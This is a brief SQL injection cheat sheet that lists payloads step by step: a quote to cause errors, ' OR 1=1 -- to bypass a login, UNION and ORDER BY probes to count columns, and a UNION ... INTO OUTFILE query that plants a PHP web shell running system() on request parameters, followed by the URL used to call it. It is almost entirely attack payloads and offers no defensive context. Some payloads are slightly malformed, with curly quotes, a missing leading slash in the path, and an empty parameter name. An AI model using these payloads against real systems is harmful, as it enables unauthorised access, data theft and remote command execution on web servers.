# SQL Injection

* Cause Error on the Web Application by input quote '

```text
SELECT * FROM users WHERE username = ''' AND password = ''
```

* Data Exfiltration by input ' OR 1=1 --

```text
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = ''
```

* Gaining Shell

First check the number of column with NULL or 1

```text
SELECT * FROM users WHERE username = 'a' UNION SELECT NULL, NULL; --' AND password = ''
```

Use the INTO FILE to create a php file in the web server

```text
SELECT * FROM users WHERE username = 'a' 
UNION SELECT “<? system($_REQUEST[‘cmd’]); ?>”, NULL INTO OUTFILE 'var/www/cmd.php';--' AND password = ''
```

Access the web page

```text
http://yourIPaddress/cmd.php?=[command]
```

## SQL Injection Basic Techniques

Check number of columns by order by

```text
' ORDER BY 1;#
' ORDER BY 2;#
' ORDER BY 3;#
```

